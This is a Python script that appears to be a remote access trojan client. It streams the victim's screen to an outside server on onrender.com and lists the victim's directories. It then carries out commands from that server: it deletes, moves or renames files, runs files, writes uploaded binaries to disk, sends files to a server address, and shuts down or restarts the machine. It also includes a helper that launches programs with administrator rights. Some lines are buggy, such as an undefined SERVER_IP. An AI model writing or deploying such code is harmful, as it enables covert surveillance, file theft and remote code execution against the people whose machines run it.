import base64
from io import BytesIO
import os
import glob  # <--- Add this import at the top
import requests
import time
from mss import mss
import shutil
from PIL import Image
import ctypes
import sys

fps = 60
URL = "https://anotherwebsite-x1gv.onrender.com/live"


current_viewing_path = "/" 

def get_directory_items(target_path):
    try:
        # Grab everything inside the target path
        all_items = glob.glob(os.path.join(target_path, "*"))

        directory_items = []
        for item in all_items:
            # Clean filename (e.g., 'notes.txt' instead of '/path/to/notes.txt')
            clean_name = os.path.basename(item)
            
            # Check if the absolute path point is a directory or a file
            is_dir = os.path.isdir(item)
            
            # Append the structured dictionary format
            directory_items.append({
                "name": clean_name,
                "is_directory": is_dir
            })
            
        return directory_items
    except Exception as e:
        print(f"Error reading directory {target_path}: {e}")
        return []

def launch_as_admin(exe_path):
    # 'runas' forces Windows to launch the file with elevated Admin privileges
    result = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", str(exe_path), None, None, 1
    )

    # ShellExecuteW returns a value greater than 32 if it succeeded
    if result > 32:
        print("Successfully launched process as Administrator.")
    else:
        print(f"Failed to launch. Windows Error Code: {result}")

def shutdown_pc():
    """Shuts down the computer based on the operating system."""
    if sys.platform == "win32":
        # /s = shutdown, /t 1 = time delay of 1 second
        os.system("shutdown /s /t 1")
    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
        # Requires sudo privileges on Linux/macOS
        os.system("sudo shutdown -h now")
    else:
        print("Unsupported operating system.")

def restart_pc():
    """Restarts the computer based on the operating system."""
    if sys.platform == "win32":
        # /r = restart, /t 1 = time delay of 1 second
        os.system("shutdown /r /t 1")
    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
        # Requires sudo privileges on Linux/macOS
        os.system("sudo shutdown -r now")
    else:
        print("Unsupported operating system.")

print("Starting screen stream client...")
amountofframes = 0
with mss() as sct:
    monitor = sct.monitors[1]

    while True:
        start_time = time.time()

        try:
            screenshot = sct.grab(monitor)
            img = Image.frombytes(
                "RGB", screenshot.size, screenshot.bgra, "raw", "BGRX"
            )

            buffer = BytesIO()
            img.save(buffer, format="JPEG", quality=5)
            b64_frame = base64.b64encode(buffer.getvalue()).decode("utf-8")

            current_files = get_directory_items(current_viewing_path)

            # Pack the keys exactly how the updated app.py expects them
            payload = {
                "COMPUTERNAME": os.environ.get("COMPUTERNAME", "Unknown-PC"),
                "frame": b64_frame,
                "current_directory": current_viewing_path, # Sends the plain text path string
                "directory_items": current_files          # Sends the list of structured dicts
            }

            response = requests.post(URL, json=payload)

            if response.status_code == 200:
                server_reply = response.json()
                my_ip = response.get("address")
                command = server_reply.get("command")
                # 2. File Operation Instruction Unpacking Engine
                file_ops = server_reply.get("file_operations", [])
                for task in file_ops:
                    operation_type = task.get("op")
                    
                    if operation_type == "navigate":
                        destination = task.get("destination")
                        print(f"Target action caught: Navigate to '{destination}'")
                        current_viewing_path = os.path.join(current_viewing_path,destination)
                        # CODE HERE: e.g., updates your tracking path or pops back using os.path.dirname
                        
                    elif operation_type == "delete":
                        target_name = task.get("target")
                        print(f"Target action caught: Delete item '{target_name}'")
                        os.remove(os.path.join(current_viewing_path,target_name))
                        # CODE HERE: e.g., os.remove or shutil.rmtree
                        
                    elif operation_type == "move":
                        target_name = task.get("target")
                        destination_root = task.get("dest")
                        print(f"Target action caught: Move '{target_name}' into '{destination_root}'")
                        shutil.move(os.path.join(current_viewing_path,target_name),os.path.join(current_viewing_path,destination_root))
                        # CODE HERE: e.g., shutil.move
                        
                    elif operation_type == "rename":
                        old = task.get("old_name")
                        new = task.get("new_name")
                        print(f"Target action caught: Rename '{old}' to '{new}'")
                        os.rename(os.path.join(current_viewing_path,old),os.path.join(current_viewing_path,new))
                        # CODE HERE: e.g., os.rename
                        
                    elif operation_type == "create_dir":
                        folder_name = task.get("name")
                        print(f"Target action caught: Create Directory '{folder_name}'")
                        os.makedirs(os.path.join(current_viewing_path,folder_name))
                        # CODE HERE: e.g., os.makedirs
                        
                    elif operation_type == "run":
                        target_name = task.get("target")
                        print(f"Target action caught: Run execute context on target '{target_name}'")
                        os.startfile(os.path.join(current_viewing_path,target_name))
                        # CODE HERE: e.g., os.startfile or subprocess.Popen
                        
                    elif operation_type == "zip":
                        target_name = task.get("target")
                        print(f"Target action caught: Archive target item '{target_name}'")
                        
                    elif operation_type == "unzip":
                        target_name = task.get("target")
                        print(f"Target action caught: Extract context from target archive '{target_name}'")
                        
                    elif operation_type == "upload":
                        filename = task.get("filename")
                        file_hex_string = task.get("raw_bytes")
                        if filename and file_hex_string:
                            try:
                                # 1. Convert the hex string back into raw binary bytes
                                raw_binary_data = bytes.fromhex(file_hex_string)
                                
                                # 2. Determine where to save it (e.g., inside your current viewing directory)
                                # Make sure 'current_viewing_path' is your client's active directory variable
                                save_path = os.path.join(current_viewing_path, filename)
                                
                                # 3. Write the raw bytes to disk
                                with open(save_path, "wb") as f:
                                    f.write(raw_binary_data)
                                    
                                print(f"[Success] File saved locally to {save_path}")
                                
                            except Exception as e:
                                print(f"Failed to write uploaded file: {e}")
                        print(f"Target action caught: Drop file content for '{filename}'")
                    elif operation_type == "download":
                        target_filename = task.get("target")
                        
                        # Resolve the absolute path based on your current tracking position context
                        target_path = os.path.join(current_viewing_path, target_filename)
                        
                        if os.path.exists(target_path) and os.path.isfile(target_path):
                            with open(target_path, "rb") as f:
                                # Dispatch data up using the files multipart form payload assignment
                                requests.post(
                                    f"http://{SERVER_IP}:5000/files/{my_ip}/receive_download", 
                                    files={"file": (target_filename, f, "application/octet-stream")}
                                )
                if command == "Shutdown":
                    shutdown_pc()
                elif command == "Restart":
                    restart_pc()
                # print(
                #     f"Frame sent. Server response: {server_reply.get('server_message')}"
                # )
                amountofframes += 1
                if amountofframes == 24:
                    print(current_viewing_path,"Frame sent")
                    amountofframes = 0

            else:
                print(f"Server returned an error code: {response.status_code}")

        except Exception as e:
            print(f"Streaming error: {e}")

        elapsed_time = time.time() - start_time
        time_to_sleep = (1 / fps) - elapsed_time
        if time_to_sleep > 0:
            time.sleep(time_to_sleep)